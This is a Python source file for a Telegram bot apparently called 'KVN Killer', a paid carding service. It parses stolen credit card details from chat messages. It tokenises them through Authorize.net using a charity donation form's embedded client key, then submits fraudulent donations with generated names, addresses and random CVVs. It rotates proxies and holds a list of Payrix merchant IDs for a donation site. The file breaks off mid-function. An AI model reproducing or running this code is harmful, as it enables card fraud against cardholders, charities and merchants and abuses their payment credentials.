"""
KVN Killer v6.0 — UI Overhaul
- Menu redesigned to match Prince Checker style (╭─❲ ❳)
- Live plan status in menu
- Pure Single-Kill Mode (Authorize.net + Payrix)
- Full Custom Emoji Integration
"""

import asyncio
import logging
import os
import re
import sqlite3
import random
import string
import time
import json
import threading
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from typing import Optional, Dict, List, Tuple, Any
from collections import defaultdict, deque
from bs4 import BeautifulSoup
import aiohttp
from aiohttp import web, TCPConnector, ClientTimeout
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, MessageHandler, CallbackQueryHandler,
    ContextTypes, filters
)
from telegram.constants import ParseMode
from telegram.error import BadRequest, Forbidden, RetryAfter

# ═══════════════════════════════════════
# CONFIG
# ═══════════════════════════════════════
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
OWNER_ID = int(os.environ.get("OWNER_ID", 0))
HIT_CHANNEL_ID = int(os.environ.get("HIT_CHANNEL_ID", 0))

MONGO_URI = os.environ.get("MONGO_URI", "")
DB_NAME = os.environ.get("DB_NAME", "stresser_db")
PROXY_COLLECTION = os.environ.get("PROXY_COLLECTION", "proxies")

VERSION = "6.0"
CODENAME = "Phantom"

SITE_CONFIG = {
    "base_url": "https://outbermuda.org/",
    "form_id": "686",
    "referer_base": "https://outbermuda.org/",
    "auth_name": "43D8rvpNZ",
    "auth_client_key": "4yLL27sQ9HhzpHLr27sgfUY4kp894PydK6v24NadbnpX9L4m43Vm4UCX2dwn7D7U",
    "auth_id": "1dcaabea-fa2b-f4f8-631c-d335badfda3f",
}

PAYMENT_GATEWAYS = [
    {"cid": "10334", "merchant": "p1_mer_66d212af800dc73de2ba7dd"},
    {"cid": "1071", "merchant": "p1_mer_669024d6e619d1ab217503d"},
    {"cid": "11488", "merchant": "p1_mer_66d2047bc7d50f8781e718d"},
    {"cid": "11607", "merchant": "p1_mer_669033821d7a054a353b357"},
    {"cid": "11674", "merchant": "p1_mer_6690210f7e21af07ed53a56"},
    {"cid": "1177", "merchant": "p1_mer_66902775744ddec5a326b9a"},
    {"cid": "1202", "merchant": "p1_mer_66d20c09f3a939e22ce38a9"},
    {"cid": "12196", "merchant": "p1_mer_66d20ae66feda63af8d82ee"},
    {"cid": "1230", "merchant": "p1_mer_6690282ba493094f251046a"},
    {"cid": "12465", "merchant": "p1_mer_669028b79fe1716a9dd8804"},
    {"cid": "13266", "merchant": "p1_mer_6690537c2d41ffed74ffecd"},
    {"cid": "13372", "merchant": "p1_mer_669028c9e4d4a6e3b893c56"},
    {"cid": "13429", "merchant": "p1_mer_66d207c90e53b855478fc36"},
    {"cid": "13430", "merchant": "p1_mer_66d20a5f65471c1e94aee92"},
    {"cid": "13440", "merchant": "p1_mer_66d2081286031a89b3c1b44"},
    {"cid": "14138", "merchant": "p1_mer_66d205f4ab29724cef8de2e"},
    {"cid": "14179", "merchant": "p1_mer_66d20c5d6d1a9d78a7d43d8"},
    {"cid": "14225", "merchant": "p1_mer_66902179c94ff0e03437c1b"},
    {"cid": "14245", "merchant": "p1_mer_66ad21126222709f81f0599"},
    {"cid": "14259", "merchant": "p1_mer_66d209fce9d93b9615955cd"},
    {"cid": "14322", "merchant": "p1_mer_66ad21126222709f81f0599"},
    {"cid": "14349", "merchant": "p1_mer_6690260d9668ca03eb24c41"},
    {"cid": "1454", "merchant": "p1_mer_66d20760b7fa378e43aef7e"},
    {"cid": "1467", "merchant": "p1_mer_6690252033ed0d624b8d076"},
    {"cid": "14692", "merchant": "p1_mer_66c778f4afcc3621c171e02"},
    {"cid": "14866", "merchant": "p1_mer_66d20c184d303299114bde7"},
    {"cid": "14884", "merchant": "p1_mer_66d20cf417b3b468afd637a"},
    {"cid": "14893", "merchant": "p1_mer_66902690e4d66dcc4a06fea"},
    {"cid": "14952", "merchant": "p1_mer_66d205f4ab29724cef8de2e"},
    {"cid": "15029", "merchant": "p1_mer_66d20ba6ea0b2bb826de94d"},
    {"cid": "15107", "merchant": "p1_mer_66d2055f509bf1982940ba3"},
    {"cid": "15508", "merchant": "p1_mer_669025e76463f87012fe294"},
    {"cid": "15523", "merchant": "p1_mer_66d20c26dd40ed50b6fa36e"},
    {"cid": "15630", "merchant": "p1_mer_6644eb51e726bbf463a4476"},
    {"cid": "15633", "merchant": "p1_mer_669025d4de98f58b3ba38ea"},
    {"cid": "15709", "merchant": "p1_mer_669021f7e934f033d1bc84f"},
    {"cid": "15724", "merchant": "p1_mer_669021f7e934f033d1bc84f"},
    {"cid": "15897", "merchant": "p1_mer_66d2129436ac351e493c45f"},
    {"cid": "15901", "merchant": "p1_mer_66d2129436ac351e493c45f"},
    {"cid": "15956", "merchant": "p1_mer_66e448ead64c11e731ca8e7"},
    {"cid": "15982", "merchant": "p1_mer_66e448ead64c11e731ca8e7"},
    {"cid": "16098", "merchant": "p1_mer_66d209372ccf9b98cc1803a"},
    {"cid": "16232", "merchant": "p1_mer_66d212882cab6f5bb130a07"},
    {"cid": "16285", "merchant": "p1_mer_66d2094580dfa382719e015"},
    {"cid": "16291", "merchant": "p1_mer_66902690e4d66dcc4a06fea"},
    {"cid": "16295", "merchant": "p1_mer_66d20859d77659a4b63fd21"},
    {"cid": "16305", "merchant": "p1_mer_669020fab671c86f50f51a8"},
    {"cid": "373", "merchant": "p1_mer_66902532a403c13c858d501"},
    {"cid": "4450", "merchant": "p1_mer_669023101de0f6105e4417d"},
    {"cid": "4942", "merchant": "p1_mer_66903c7408db001950fe873"},
    {"cid": "566", "merchant": "p1_mer_66d2068e8b8cbee7c075b2a"},
    {"cid": "6002", "merchant": "p1_mer_6690266e2b133b62945a047"},
    {"cid": "8722", "merchant": "p1_mer_66d206b7aed53de56673f94"},
]

BANNED_BINS = {"535563", "543446", "532610", "485340", "531106", "494116", "516929", "435880", "517608", "416549"}

# ═══════════════════════════════════════
# FULL CUSTOM EMOJI MAP
# ═══════════════════════════════════════
CUSTOM_EMOJIS = {
    "⚡": '<tg-emoji emoji-id="5879783483462655267">⚡</tg-emoji>',
    "✅": '<tg-emoji emoji-id="5870702999180942496">✅</tg-emoji>',
    "💳": '<tg-emoji emoji-id="5855210601172705878">💳</tg-emoji>',
    "🔗": '<tg-emoji emoji-id="4958689671950369798">🔗</tg-emoji>',
    "💬": '<tg-emoji emoji-id="5855024182412188879">💬</tg-emoji>',
    "🏷": '<tg-emoji emoji-id="5854776663446920778">🏷</tg-emoji>',
    "🏦": '<tg-emoji emoji-id="5854957696318447867">🏦</tg-emoji>',
    "🌍": '<tg-emoji emoji-id="5852982548233199026">🌍</tg-emoji>',
    "👽": '<tg-emoji emoji-id="5343993902493895946">👽</tg-emoji>',
    "👑": '<tg-emoji emoji-id="5854931759010946555">👑</tg-emoji>',
    "🌚": '<tg-emoji emoji-id="6298678524379137990">🌚</tg-emoji>',
    "🟢": '<tg-emoji emoji-id="5854964615510762741">🟢</tg-emoji>',
    "💳1": '<tg-emoji emoji-id="6206233180148603109">💳</tg-emoji>',
    "💳2": '<tg-emoji emoji-id="5800709991627232190">💳</tg-emoji>',
    "💵": '<tg-emoji emoji-id="6206155797722830770">💵</tg-emoji>',
    "🚀": '<tg-emoji emoji-id="6147654280112248427">🚀</tg-emoji>',
    "⭐️": '<tg-emoji emoji-id="6206404510689007446">⭐️</tg-emoji>',
    "💔": '<tg-emoji emoji-id="5971992406923416087">💔</tg-emoji>',
    "⚡1": '<tg-emoji emoji-id="6026367225466720832">⚡</tg-emoji>',
    "⚡2": '<tg-emoji emoji-id="5229064374403998351">⚡</tg-emoji>',
    "💠": '<tg-emoji emoji-id="5971837723676249096">💠</tg-emoji>',
    "✅1": '<tg-emoji emoji-id="6298612102709909362">✅</tg-emoji>',
    "🔥": '<tg-emoji emoji-id="5267500801240092311">🔥</tg-emoji>',
    "❌": '<tg-emoji emoji-id="5440681540541502133">❌</tg-emoji>',
    "⚠️": '<tg-emoji emoji-id="5420323339723881652">⚠️</tg-emoji>',
    "💰": '<tg-emoji emoji-id="6190336264940559752">💰</tg-emoji>',
    "⏱": '<tg-emoji emoji-id="5382194935057372936">⏱</tg-emoji>',
    "🛍️": '<tg-emoji emoji-id="5456140674028019486">🛍️</tg-emoji>',
    "👑1": '<tg-emoji emoji-id="5893473283696759404">👑</tg-emoji>',
    "👤": '<tg-emoji emoji-id="5895652322469482989">👤</tg-emoji>',
    "⚙️": '<tg-emoji emoji-id="5282843764451195532">⚙️</tg-emoji>',
    "⏰": '<tg-emoji emoji-id="5895713431264170680">⏰</tg-emoji>',
    "💻": '<tg-emoji emoji-id="5222079954421818267">💻</tg-emoji>',
    "⭐": '<tg-emoji emoji-id="5042334757040423886">⭐</tg-emoji>',
}

def ce(emoji: str) -> str:
    return CUSTOM_EMOJIS.get(emoji, emoji)

# ═══════════════════════════════════════
# LOGGING
# ═══════════════════════════════════════
logging.basicConfig(
    format="%(asctime)s ┃ %(name)s ┃ %(levelname)s ┃ %(message)s",
    level=logging.INFO,
    datefmt="%H:%M:%S"
)
logger = logging.getLogger(f"KVN-v{VERSION}")

# ═══════════════════════════════════════
# DATACLASSES
# ═══════════════════════════════════════
@dataclass
class User:
    user_id: int
    username: str = ""
    first_name: str = ""
    plan_expiry: Optional[str] = None
    kill_credits: int = 0
    kill_count: int = 0
    is_banned: int = 0
    is_admin: int = 0
    joined_at: str = ""

@dataclass
class BINInfo:
    brand: str = "Unknown"
    type: str = "Unknown"
    sub_type: str = "Unknown"
    bank: str = "Unknown"
    country: str = "Unknown"
    country_code: str = "🌍"
    bin: str = ""

@dataclass
class ProxyEntry:
    raw: str
    url: str
    host: str
    port: str
    auth: Optional[Tuple[str, str]] = None
    fail_count: int = 0
    success_count: int = 0
    last_used: float = 0.0
    is_active: bool = True

# ═══════════════════════════════════════
# RATE LIMITER
# ═══════════════════════════════════════
class RateLimiter:
    def __init__(self):
        self._windows: Dict[int, deque] = defaultdict(lambda: deque(maxlen=20))
        self._cooldowns: Dict[int, float] = {}
        self._lock = asyncio.Lock()

    async def check(self, user_id: int, cooldown: float = 5.0) -> Tuple[bool, float]:
        async with self._lock:
            now = time.time()
            if user_id in self._cooldowns:
                remaining = self._cooldowns[user_id] - now
                if remaining > 0:
                    return False, round(remaining, 1)
            self._cooldowns[user_id] = now + cooldown
            return True, 0.0

rate_limiter = RateLimiter()

# ═══════════════════════════════════════
# CC REGEX
# ═══════════════════════════════════════
CC_PATTERN = re.compile(
    r"(?:(?:[/!.#]kill)\s+)?" +
    r"(\d{16})[|\s/:.-]+(\d{1,2})[|\s/:.-]+(?:20)?(\d{2})[|\s/:.-]+(\d{3,4})" +
    r"|" +
    r"(\d{16})[|\s/:.-]+(\d{1,2})[|\s/:.-]+(\d{4})[|\s/:.-]+(\d{3,4})" +
    r"|" +
    r"(\d{16})\D+?(\d{1,2})\D+?(\d{2,4})\D+?(\d{3,4})" +
    r"|" +
    r"(?:cc|card)[:\s]+(\d{16})[|\s/:.-]+(\d{1,2})[|\s/:.-]+(\d{2,4})[|\s/:.-]+(\d{3,4})" +
    r"|" +
    r"(?:card\s*number[:\s]*|cc[:\s]*)?(\d{4}[\s.-]?\d{4}[\s.-]?\d{4}[\s.-]?\d{4})[\s|/:.-]*(\d{1,2})[\s|/:.-]*(\d{2,4})[\s|/:.-]*(\d{3,4})" +
    r"|" +
    r"(\d{16})[\s]*exp[\s.-]*(\d{1,2})[\s/.-]*(\d{2,4})[\s]*cvv[\s]*(\d{3,4})" +
    r"|" +
    r"(\d{16})[\s]*(?:exp|expiry|expiration)[\s:.-]*(\d{1,2})/(\d{2,4})[\s]*(?:cvv|cvc|security)[\s:.-]*(\d{3,4})",
    re.IGNORECASE
)

def parse_cc(text: str) -> Optional[Tuple[str, str, str, str]]:
    m = CC_PATTERN.search(text)
    if not m:
        return None
    groups = m.groups()
    for i in range(0, len(groups), 4):
        if groups[i]:
            card, mm, yy, cvv = groups[i], groups[i+1], groups[i+2], groups[i+3]
            mm = mm.zfill(2)
            if len(yy) == 4:
                yy = yy[2:]
            return card, mm, yy, cvv
    return None

# ═══════════════════════════════════════
# SQLITE DATABASE
# ═══════════════════════════════════════
class Database:
    def __init__(self, db_path: str = "kvn_phantom.db"):
        self.db_path = db_path
        self._local = threading.local()
        self._init()

    def _get_conn(self):
        if not hasattr(self._local, 'conn'):
            self._local.conn = sqlite3.connect(self.db_path, check_same_thread=False)
        return self._local.conn

    def _init(self):
        conn = sqlite3.connect(self.db_path, check_same_thread=False)
        c = conn.cursor()
        c.execute("""CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT,
            plan_expiry TEXT, kill_credits INTEGER DEFAULT 0, kill_count INTEGER DEFAULT 0,
            is_banned INTEGER DEFAULT 0, is_admin INTEGER DEFAULT 0, joined_at TEXT)""")
        c.execute("""CREATE TABLE IF NOT EXISTS keys (
            key_str TEXT PRIMARY KEY, days INTEGER, redeemed_by INTEGER, redeemed_at TEXT)""")
        c.execute("""CREATE TABLE IF NOT EXISTS settings (
            key TEXT PRIMARY KEY, value TEXT)""")
        conn.commit()
        conn.close()

    def _exec(self, query: str, params: tuple = ()) -> list:
        conn = sqlite3.connect(self.db_path, check_same_thread=False)
        conn.execute("PRAGMA journal_mode=WAL")
        c = conn.cursor()
        c.execute(query, params)
        result = c.fetchall()
        conn.commit()
        conn.close()
        return result

    def get_user(self, user_id: int) -> Optional[User]:
        rows = self._exec("SELECT * FROM users WHERE user_id = ?", (user_id,))
        if not rows:
            return None
        r = rows[0]
        return User(
            user_id=r[0], username=r[1] or "", first_name=r[2] or "",
            plan_expiry=r[3], kill_credits=r[4], kill_count=r[5],
            is_banned=r[6], is_admin=r[7], joined_at=r[8] or ""
        )

    def ensure_user(self, user_id: int, username: str = "", first_name: str = ""):
        if not self.get_user(user_id):
            self._exec(
                "INSERT INTO users (user_id, username, first_name, plan_expiry, kill_credits, "
                "kill_count, is_banned, is_admin, joined_at) "
                "VALUES (?, ?, ?, NULL, 0, 0, 0, 0, ?)",
                (user_id, username, first_name, datetime.now().isoformat())
            )
        else:
            if username or first_name:
                self._exec("UPDATE users SET username = ?, first_name = ? WHERE user_id = ?",
                           (username, first_name, user_id))

    def has_active_plan(self, user_id: int) -> bool:
        user = self.get_user(user_id)
        if not user or not user.plan_expiry:
            return False
        try:
            return datetime.fromisoformat(user.plan_expiry) > datetime.now()
        except:
            return False

    def add_plan_days(self, user_id: int, days: int):
        user = self.get_user(user_id)
        base = datetime.now()
        if user and user.plan_expiry:
            try:
                cur = datetime.fromisoformat(user.plan_expiry)
                if cur > base:
                    base = cur
            except:
                pass
        self._exec("UPDATE users SET plan_expiry = ? WHERE user_id = ?",
                   ((base + timedelta(days=days)).isoformat(), user_id))

    def add_kill_credits(self, user_id: int, amount: int):
        self._exec("UPDATE users SET kill_credits = kill_credits + ? WHERE user_id = ?",
                   (amount, user_id))

    def deduct_kill_credit(self, user_id: int) -> bool:
        user = self.get_user(user_id)
        if not user or user.kill_credits <= 0:
            return False
        self._exec("UPDATE users SET kill_credits = kill_credits - 1, kill_count = kill_count + 1 WHERE user_id = ?",
                   (user_id,))
        return True

    def ban(self, user_id: int):
        self._exec("UPDATE users SET is_banned = 1 WHERE user_id = ?", (user_id,))

    def unban(self, user_id: int):
        self._exec("UPDATE users SET is_banned = 0 WHERE user_id = ?", (user_id,))

    def is_banned(self, user_id: int) -> bool:
        user = self.get_user(user_id)
        return user.is_banned == 1 if user else False

    def get_stats(self) -> dict:
        return {
            "users": self._exec("SELECT COUNT(*) FROM users")[0][0],
            "kills": self._exec("SELECT SUM(kill_count) FROM users")[0][0] or 0
        }

    def gen_key(self, days: int) -> str:
        key = "KVN-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=16))
        self._exec("INSERT INTO keys (key_str, days, redeemed_by, redeemed_at) VALUES (?, ?, NULL, NULL)",
                   (key, days))
        return key

    def redeem_key(self, key: str, user_id: int) -> Optional[int]:
        rows = self._exec("SELECT days, redeemed_by FROM keys WHERE key_str = ?", (key,))
        if not rows or rows[0][1] is not None:
            return None
        self._exec("UPDATE keys SET redeemed_by = ?, redeemed_at = ? WHERE key_str = ?",
                   (user_id, datetime.now().isoformat(), key))
        self.add_plan_days(user_id, rows[0][0])
        return rows[0][0]

    def get_credits(self, user_id: int) -> int:
        user = self.get_user(user_id)
        return user.kill_credits if user else 0

db = Database()

# ═══════════════════════════════════════
# PROXY POOL
# ═══════════════════════════════════════
class ProxyPool:
    def __init__(self):
        self._mongo_active = False
        self._coll = None
        self._fallback: List[ProxyEntry] = []
        self._lock = asyncio.Lock()
        self._init_mongo()

    def _init_mongo(self):
        if not MONGO_URI:
            logger.warning(f"{ce('⚠️')} No MONGO_URI — proxy pool running in fallback mode")
            return
        try:
            import pymongo
            client = pymongo.MongoClient(MONGO_URI, serverSelectionTimeoutMS=5000)
            self._coll = client[DB_NAME][PROXY_COLLECTION]
            self._coll.create_index("proxy_string", unique=True)
            self._mongo_active = True
            logger.info(f"{ce('✅')} MongoDB connected — smart proxy pool active")
        except Exception as e:
            logger.error(f"MongoDB connection failed: {e}")
            self._mongo_active = False

    def parse(self, proxy_str: str) -> Optional[ProxyEntry]:
        parts = proxy_str.strip().split(":")
        if len(parts) == 2:
            h, p = parts
            return ProxyEntry(raw=proxy_str, url=f"http://{h}:{p}", host=h, port=p, auth=None)
        elif len(parts) == 4:
            h, p, u, pw = parts
            return ProxyEntry(raw=proxy_str, url=f"http://{u}:{pw}@{h}:{p}", host=h, port=p, auth=(u, pw))
        return None

    async def add(self, proxy_str: str) -> bool:
        entry = self.parse(proxy_str)
        if not entry:
            return False
        if self._mongo_active:
            try:
                self._coll.update_one(
                    {"proxy_string": entry.raw},
                    {"$set": {
                        "proxy_url": entry.url, "is_active": True,
                        "fail_count": 0, "success_count": 0,
                        "last_used": None, "health_score": 100
                    }},
                    upsert=True
                )
                return True
            except Exception as e:
                logger.error(f"Proxy add error: {e}")
                return False
        else:
            if not any(p.raw == entry.raw for p in self._fallback):
                self._fallback.append(entry)
                return True
            return False

    async def get_random(self) -> Optional[dict]:
        if self._mongo_active:
            try:
                res = list(self._coll.aggregate([
                    {"$match": {"is_active": True, "fail_count": {"$lt": 5}}},
                    {"$sample": {"size": 1}}
                ]))
                if res:
                    self._coll.update_one(
                        {"_id": res[0]["_id"]},
                        {"$set": {"last_used": datetime.now()}}
                    )
                    return {"url": res[0]["proxy_url"], "raw": res[0]["proxy_string"]}
            except Exception as e:
                logger.error(f"Proxy get error: {e}")
        else:
            active = [p for p in self._fallback if p.is_active and p.fail_count < 5]
            if active:
                entry = random.choice(active)
                entry.last_used = time.time()
                return {"url": entry.url, "raw": entry.raw}
        return None

    async def mark_success(self, proxy_url: str):
        if self._mongo_active:
            self._coll.update_one(
                {"proxy_url": proxy_url},
                {"$inc": {"success_count": 1}, "$set": {"health_score": 100}}
            )
        else:
            for p in self._fallback:
                if p.url == proxy_url:
                    p.success_count += 1
                    break

    async def mark_failed(self, proxy_url: str):
        if self._mongo_active:
            self._coll.update_one(
                {"proxy_url": proxy_url},
                {"$inc": {"fail_count": 1}}
            )
            self._coll.update_one(
                {"proxy_url": proxy_url, "fail_count": {"$gte": 5}},
                {"$set": {"is_active": False, "health_score": 0}}
            )
        else:
            for p in self._fallback:
                if p.url == proxy_url:
                    p.fail_count += 1
                    if p.fail_count >= 5:
                        p.is_active = False
                    break

    async def list_all(self) -> List[dict]:
        if self._mongo_active:
            return list(self._coll.find({}, {"_id": 0, "proxy_string": 1, "is_active": 1, "fail_count": 1, "success_count": 1}))
        return [{"proxy_string": p.raw, "is_active": p.is_active, "fail_count": p.fail_count, "success_count": p.success_count} for p in self._fallback]

    async def delete_by_index(self, idx: int) -> bool:
        if self._mongo_active:
            active = list(self._coll.find({"is_active": True}))
            if 0 <= idx < len(active):
                self._coll.delete_one({"_id": active[idx]["_id"]})
                return True
            return False
        else:
            active = [p for p in self._fallback if p.is_active]
            if 0 <= idx < len(active):
                self._fallback.remove(active[idx])
                return True
            return False

    async def count_active(self) -> int:
        if self._mongo_active:
            return self._coll.count_documents({"is_active": True})
        return sum(1 for p in self._fallback if p.is_active)

    async def count_total(self) -> int:
        if self._mongo_active:
            return self._coll.count_documents({})
        return len(self._fallback)

    async def reload(self):
        if self._mongo_active:
            self._coll.update_many(
                {"fail_count": {"$lt": 10}},
                {"$set": {"is_active": True, "fail_count": 0}}
            )
        else:
            for p in self._fallback:
                p.is_active = True
                p.fail_count = 0

proxy_pool = ProxyPool()

# ═══════════════════════════════════════
# HTTP SESSION MANAGER
# ═══════════════════════════════════════
class SessionManager:
    def __init__(self):
        self._connector: Optional[TCPConnector] = None
        self._session: Optional[aiohttp.ClientSession] = None

    async def get_session(self, proxy_url: Optional[str] = None) -> aiohttp.ClientSession:
        if proxy_url:
            connector = TCPConnector(limit=50, ssl=False, force_close=False)
            timeout = ClientTimeout(total=20)
            return aiohttp.ClientSession(connector=connector, timeout=timeout)
        if self._session is None or self._session.closed:
            self._connector = TCPConnector(limit=100, ssl=False, force_close=False)
            self._session = aiohttp.ClientSession(
                connector=self._connector,
                timeout=ClientTimeout(total=30)
            )
        return self._session

    async def close(self):
        if self._session and not self._session.closed:
            await self._session.close()
        if self._connector:
            await self._connector.close()

session_mgr = SessionManager()

# ═══════════════════════════════════════
# HELPERS
# ═══════════════════════════════════════
def extract_signatures(response_text: str) -> Tuple[Optional[str], Optional[str]]:
    matches = re.findall(
        r"givewp-route-signature=([a-f0f0]+).*?givewp-route-signature-expiration=(\d+)",
        response_text
    )
    return matches[0] if matches else (None, None)

FIRST_NAMES = ["John","Emma","Michael","Sarah","David","Lisa","James","Anna","Robert","Emily",
               "Chris","Mia","Daniel","Sophia","Marcus","Olivia","Tyler","Ava","Kevin","Ella",
               "Brandon","Zoe","Nathan","Lily","Adam","Chloe","Ryan","Grace","Eric","Maya"]
LAST_NAMES = ["Smith","Johnson","Brown","Taylor","Wilson","Davis","Clark","Lewis","Walker","Hall",
              "Young","King","Wright","Lopez","Hill","Scott","Green","Adams","Baker","Nelson",
              "Carter","Mitchell","Perez","Roberts","Turner","Phillips","Campbell","Parker","Evans","Edwards"]

CITIES = [
    ("New York", "NY"), ("Los Angeles", "CA"), ("Chicago", "IL"), ("Houston", "TX"),
    ("Phoenix", "AZ"), ("Philadelphia", "PA"), ("Dallas", "TX"), ("Miami", "FL"),
    ("Seattle", "WA"), ("Denver", "CO"), ("Boston", "MA"), ("Atlanta", "GA"),
    ("Portland", "OR"), ("Las Vegas", "NV"), ("Austin", "TX"), ("Nashville", "TN"),
]
STREETS = ["Main","Park","Oak","Pine","Cedar","Elm","Washington","Lake","Hill","River","Spring","Maple","Sunset","Highland","Ridge"]

def generate_random_name() -> Tuple[str, str]:
    return random.choice(FIRST_NAMES), random.choice(LAST_NAMES)

def generate_random_phone() -> str:
    return f"+1{random.randint(200,999)}{random.randint(200,999)}{random.randint(1000,9999)}"

def generate_random_email(fn: str, ln: str) -> str:
    domains = ["gmail.com","yahoo.com","hotmail.com","outlook.com","icloud.com","proton.me"]
    suffix = "".join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(4,7)))
    return f"{fn.lower()}{ln.lower()}{suffix}@{random.choice(domains)}"

def generate_random_address() -> Tuple[str, str, str, str]:
    city, state = random.choice(CITIES)
    street = random.choice(STREETS)
    return f"{random.randint(1,9999)} {street} St", city, state, str(random.randint(10000,99999))

def get_form_headers() -> dict:
    return {
        'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36",
        'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
        'sec-ch-ua-mobile': "?1",
        'sec-ch-ua-platform': '"Android"',
        'Upgrade-Insecure-Requests': "1",
        'Sec-Fetch-Site': "same-origin",
        'Sec-Fetch-Mode': "navigate",
        'Sec-Fetch-Dest': "iframe",
        'Referer': SITE_CONFIG["referer_base"],
    }

def get_auth_headers() -> dict:
    return {
        'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36",
        'Content-Type': "application/json",
        'sec-ch-ua-platform': '"Android"',
        'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
        'sec-ch-ua-mobile': "?1",
        'Origin': SITE_CONFIG["base_url"],
        'Sec-Fetch-Site': "cross-site",
        'Sec-Fetch-Mode': "cors",
        'Sec-Fetch-Dest': "empty",
        'Referer': SITE_CONFIG["base_url"] + "/",
    }

def get_donation_headers() -> dict:
    return {
        'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36",
        'Accept': "application/json",
        'sec-ch-ua-platform': '"Android"',
        'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
        'sec-ch-ua-mobile': "?1",
        'Origin': SITE_CONFIG["base_url"],
        'Sec-Fetch-Site': "same-origin",
        'Sec-Fetch-Mode': "cors",
        'Sec-Fetch-Dest': "empty",
        'Referer': f"{SITE_CONFIG['base_url']}/?givewp-route=donation-form-view&form-id={SITE_CONFIG['form_id']}"
    }

async def bin_lookup(card_number: str, session: aiohttp.ClientSession, proxy_url: Optional[str] = None) -> BINInfo:
    bn = card_number[:6]
    url = f"https://api.juspay.in/cardbins/{bn}"

    for attempt in range(2):
        try:
            kw = {"proxy": proxy_url} if proxy_url and attempt == 0 else {}
            async with session.get(url, timeout=ClientTimeout(total=8), ssl=False, **kw) as resp:
                if resp.status == 200:
                    d = await resp.json()
                    return BINInfo(
                        brand=d.get("brand", "Unknown"),
                        type=d.get("type", "Unknown"),
                        sub_type=d.get("card_sub_type", "Unknown"),
                        bank=d.get("bank", "Unknown"),
                        country=d.get("country", "Unknown"),
                        country_code=d.get("country_code", "🌍"),
                        bin=bn
                    )
        except Exception as e:
            logger.error(f"BIN attempt {attempt+1}: {e}")
            if attempt == 0 and proxy_url:
                continue
            break

    return BINInfo(bin=bn)

# ═══════════════════════════════════════
# KILLER GATEWAY
# ═══════════════════════════════════════
class KillerGateway:
    @staticmethod
    async def donation_attempt(card_number: str, expiration: str,
                                donation_params: dict, attempt_num: int) -> bool:
        req_id = f"Req-{attempt_num}-{random.randint(100,999)}"
        try:
            cvv = str(random.randint(100, 999))
            amount = str(random.randint(200000, 200000))
            fn, ln = generate_random_name()
            phone = generate_random_phone()
            email = generate_random_email(fn, ln)
            a1, city, state, zc = generate_random_address()

            auth_payload = {
                "securePaymentContainerRequest": {
                    "merchantAuthentication": {
                        "name": SITE_CONFIG["auth_name"],
                        "clientKey": SITE_CONFIG["auth_client_key"]
                    },
                    "data": {
                        "type": "TOKEN",
                        "id": SITE_CONFIG["auth_id"],
                        "token": {
                            "cardNumber": card_number,
                            "expirationDate": expiration,
                            "cardCode": cvv
                        }
                    }
                }
            }

            session = await session_mgr.get_session()
            async with session.post(
                "https://api2.authorize.net/xml/v1/request.api",
                json=auth_payload, headers=get_auth_headers(),
                timeout=ClientTimeout(total=30), ssl=False
            ) as resp:
                auth_text = (await resp.text()).lstrip('\ufeff')
                auth_data = json.loads(auth_text)

            if auth_data.get("messages", {}).get("resultCode") != "Ok":
                return True

            dd = auth_data.get("opaqueData", {}).get("dataDescriptor")
            dv = auth_data.get("opaqueData", {}).get("dataValue")
            if not dd or not dv:
                return True

            donation_payload = {
                'amount': amount, 'currency': 'USD', 'donationType': 'single',
                'formId': SITE_CONFIG["form_id"], 'gatewayId': 'authorize',
                'firstName': fn, 'lastName': ln, 'email': email,
                'anonymous': 'false', 'comment': '', 'company': 'Neend gen',
                'phone': phone, 'country': 'US', 'address1': a1,
                'address2': '', 'city': city, 'state': state, 'zip': zc,
                'originUrl': SITE_CONFIG["referer_base"],
                'gatewayData[give_authorize_data_descriptor]': dd,
                'gatewayData[give_authorize_data_value]': dv
            }
            async with session.post(
                SITE_CONFIG["base_url"], params=donation_params,
                data=donation_payload, headers=get_donation_headers(),
                timeout=ClientTimeout(total=60), ssl=False
            ) as resp:
                donation_data = await resp.json()
                return not donation_data.get("success", False)
        except Exception as e:
            logger.error(f"[{req_id}] Error: {e}")
            return True

    @staticmethod
    async def payrix_check(card: str, mm: str, yy: str, cvv: str) -> str:
        try:
            gw = random.choice(PAYMENT_GATEWAYS)
            cid, merchant = gw["cid"], gw["merchant"]
            if not cvv:
                cvv = str(random.randint(100, 999))

            h1 = {
                'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36",
                'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                'Cache-Control': "max-age=0",
                'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
                'sec-ch-ua-mobile': "?1",
                'sec-ch-ua-platform': '"Android"',
                'Upgrade-Insecure-Requests': "1",
                'Sec-Fetch-Site': "cross-site",
                'Sec-Fetch-Mode': "navigate",
                'Sec-Fetch-User': "?1",
                'Sec-Fetch-Dest': "document",
                'Referer': "https://www.womensurgeons.org/donate-to-the-foundation",
                'Accept-Language': "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7"
            }

            session = await session_mgr.get_session()
            async with session.get(
                "https://donate.givedirect.org", params={"cid": cid},
                headers=h1, timeout=ClientTimeout(total=30), ssl=False
